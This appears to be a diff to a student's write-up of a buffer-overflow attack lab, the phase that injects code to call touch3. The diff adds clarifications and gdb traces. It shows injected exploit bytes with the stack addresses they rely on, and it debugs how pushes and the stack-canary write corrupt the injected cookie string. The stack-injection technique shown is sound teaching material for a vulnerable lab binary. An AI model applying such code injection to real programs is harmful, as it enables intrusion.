@@ -1707,14 +1707,14 @@ objdump -d assem_lv3.o > assem_lv3.d
  10    c:   c3                      retq
 ```
 
-2.3) The copy the byte code and the byte sequence of my cookie in 1.1 to my exploit code. 
+2.3) The copy the byte code and the byte sequence of my cookie to my exploit code. 
 
 ```assembly
   /* The byte sequence of my cookie as a string. There is a terminal '\0' after '61'. */
   1 35 39 62 39     /* The address is %rsp: $0x5561dc78. The string starts.  */
   2 39 37 66 61
-  3 00 00 00 00		/* This line starts at 0x5561dc80 */
-  4 48 c7 c7 78     /* The byte code of my exploit assembly  */
+  3 00 00 00 00		/* This line starts at 0x5561dc80. */
+  4 48 c7 c7 78     /* The byte code of my exploit assembly starting at 0x5561dc84  */
   5 dc 61 55 68
   6 fa 18 40 00
   7 c3 00 00 00
@@ -1759,7 +1759,9 @@ My exploit transfers control to the `touch3`, but it doesn't satisfy the `hexmat
   # ...
 ```
 
-3.1) I find that the first argument `%rdi`  of the `strncmp`is an empty string. What's wrong ? It is `sval` which is my input cookie. This `%rdi` is from the `%rsi` of the arguments of `hexmatch`. 
+3.1) I find that the first argument `%rdi`  of the `strncmp`is an empty string. What's wrong ? 
+
+3.1.1) It is `sval` which is my input cookie. This `%rdi` is from the `%rsi` of the arguments of `hexmatch`. 
 
 One thing I didn't notice is that the stack after `getbuf` is reset, therefore, I should pay attention to whether my exploit is contaminated or not. Another thing I didn't realised is that each `push` or `pop` increases or decreases 8 bytes in a x86-64 machine. 
 
@@ -1774,32 +1776,55 @@ Rerun the program to the beginning of `hexmatch`.
   401908:	48 89 fe             	mov    %rdi,%rsi
   40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
   401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
+  # ...
 
 000000000040184c <hexmatch>:
   40184c:	41 54                	push   %r12
   40184e:	55                   	push   %rbp
-> 40184f:	53                   	push   %rbx	 # This %rbx is from %rdi in "hexmatch".
+  # This %rbx is from %rdi in "touch3". It is the cookie in hex: 0x59b997fa.
+> 40184f:	53                   	push   %rbx	 
   401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp  # add $-128, %rsp
   401854:	41 89 fc             	mov    %edi,%r12d
   401857:	48 89 f5             	mov    %rsi,%rbp
   40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
+  401868:	31 c0                	xor    %eax,%eax
+  # ...
 ```
 
-Then `(gdb)display  /s ($rsi)` to monitor when it is corrupted. After executing  the instruction at `0x40184f`, my input cookie string is contaminated. The reason is that `%rbx` is pushed to the stack; its value is `0x5561dc78` which is come from `touch3`.  We can see that the character after `fa` is `x` in `"59b997fax\334aU"` and `'x'` is represented by `0x78`.  Got it!
+3.1.2) Then `(gdb)display  /s $rsi` and `display /x $rsp` to monitor when it is corrupted. Note that each instruction of `push` decrease the stack to lower address. After executing  the instruction at `0x40184f`, my input cookie string is contaminated. The reason is that `%rbx` is pushed to the stack; its value is `0x5561dc78` which is passed from `touch3`.  We can see that the character after `fa` is `x` in `"59b997fax\334aU"` and `'x'` is exactly represented by `0x78`.  Got it! 
 
 ```shell
-(gdb)
+(gdb) nexti
 0x000000000040184f      62      in visible.c
-1: x/s ($rsi)  0x5561dc78:      "59b997fa"
+3: /x $rsp = 0x5561dc88
+1: x/s $rsi  0x5561dc78:        "59b997fa"
 (gdb)
 0x0000000000401850      62      in visible.c
-1: x/s ($rsi)  0x5561dc78:      "59b997fax\334aU"
-# Display the content in %rsp.
-(gdb)
-0x0000000000401850      62      in visible.c
-2: /x $rsp = 0x5561dc80
-# Examine the first byte at 0x5561dc80; it is 0x78. 
+3: /x $rsp = 0x5561dc80
+1: x/s $rsi  0x5561dc78:        "59b997fax\334aU"
+# Examine the first byte at 0x5561dc80; it is 0x78. N.B.it is a little-endian machine. 
 (gdb) x/1bx $rsp
 0x5561dc80:     0x78
 ```
+
+3.1.3) Now the content in `%rsp`  is `0x5561dc00` and that in `%rbp` is `0x5561dc78` when the instruction at `0x401857` is being executed. 
+
+```shell
+(gdb) print /x $rsp
+$10 = 0x5561dc00
+(gdb) print /x $rbp
+$11 = 0x5561dc78
+(gdb) x/s $rbp
+0x5561dc78:     "59b997fax\334aU"
+```
+
+After the following instruction, the string at `(%rbp) 0x5561dc78` becomes empty `""`. The value of the stack canary, `%fs:0x28`,  overwrites it. 
+
+```assembly
+40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)   # 0x5561dc00 + 0x78 = 0x5561dc78
+```
+
+
 
